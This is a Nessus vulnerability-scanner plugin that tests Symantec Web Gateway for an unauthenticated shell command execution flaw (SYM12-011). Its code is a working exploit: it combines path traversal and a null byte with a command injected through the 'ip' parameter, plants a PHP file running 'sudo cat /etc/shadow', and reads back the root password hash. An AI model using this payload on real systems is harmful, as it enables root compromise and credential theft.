#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61435);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/05/06 17:22:01 $");

  script_cve_id("CVE-2012-2957", "CVE-2012-2976");
  script_bugtraq_id(54427, 54429);
  script_osvdb_id(
    84119,
    84121,
    128850,
    128851,
    128852
  );
  script_xref(name:"TRA", value:"TRA-2012-16");
  script_xref(name:"CERT", value:"108471");
  script_xref(name:"EDB-ID", value:"20064");

  script_name(english:"Symantec Web Gateway Multiple Script Shell Command Execution (SYM12-011)");
  script_summary(english:"Retrieves the contents of /etc/shadow.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is affected by a shell command execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The Symantec Web Gateway install on the remote host is affected by a
remote shell command execution vulnerability due to its failure to
sanitize input to the 'ip' parameter of the 'fromha.php' script.

An unauthenticated, remote attacker can exploit this vulnerability to
save a random PHP script on the affected host and then execute that as
a privileged user. 

Note that this install is likely affected by several other issues,
although this plugin has not checked for them."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-16");
  # http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120720_00
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b9817748");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to Symantec Web Gateway version 5.0.3.18 and apply database
upgrade 5.0.0.438."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Symantec Web Gateway 5.0.3 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:web_gateway");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("symantec_web_gateway_detect.nasl");
  script_require_keys("www/symantec_web_gateway");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443, php:TRUE);
install = get_install_from_kb(appname:'symantec_web_gateway', port:port, exit_on_fail:TRUE);

base_url = build_url(qs:install['dir'], port:port);

dir = '/var/www/html/spywall/';
shell = 'cleaner/nessus' + rand_str() + unixtime() + '.php';
cmd = 'echo "<?php system(\'sudo cat /etc/shadow\'); ?>" > ' + dir + shell;
postdata = 'policy=1&ip=|' + cmd + '|';

exploit_url = "/spywall/download_file.php?language=../ciu/fromha.php%00";

res = http_send_recv3(method:"POST",
                      item:exploit_url,
                      data:postdata,
                      port:port,
                      add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"),
                      exit_on_fail:TRUE);

sleep(2);

res = http_send_recv3(method:"GET",
                      item:'/spywall/' + shell,
                      port:port,
                      exit_on_fail:TRUE);

if (res[2] =~ "^root:[^:]+:[0-9:]+:::")
{
  if (report_verbosity > 0)
  {
    item = eregmatch(pattern:"^root:([^:]+):[0-9:]+:::", string:res[2]);
    root_user = item[0];
    root_hash = item[1];
    root_hash_repl = item[1];

    for(i=strlen(root_hash)/2; i < strlen(root_hash); i++)
      root_hash_repl[i] = '*';

    root_user = str_replace(find:root_hash, replace:root_hash_repl, string:root_user);

    report =
      '\nNessus was able to exploit the vulnerability to obtain the root' +
      '\npassword hash from /etc/shadow :' +
      '\n' +
      '\n  Root user      : ' + root_user +
      '\n  Script created : ' + build_url(qs:'/spywall/' + shell, port:port) +
      '\n' +
      '\nNote that the password hash displayed here has been partially' +
      '\nobfuscated.  You may want to remove the files created by Nessus' +
      '\nin /var/www/html/spywall/cleaner after patching the vulnerability.\n';

    security_hole(extra:report, port:port);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SWG', base_url);

